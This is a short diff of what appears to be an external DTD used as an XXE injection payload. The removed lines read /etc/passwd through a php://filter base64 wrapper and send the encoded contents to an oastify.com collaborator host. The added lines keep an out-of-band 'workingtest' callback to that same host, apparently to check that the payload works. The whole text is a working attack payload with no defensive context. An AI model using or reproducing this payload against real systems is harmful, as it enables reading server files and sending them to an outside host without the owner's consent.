@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.uzxhc3xlf6wrscjemrgepfhsbjha53ts.oastify.com/'>">
+<!ENTITY % test "simple">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://workingtest.uzxhc3xlf6wrscjemrgepfhsbjha53ts.oastify.com/'>">
 %eval;
 %exfil;
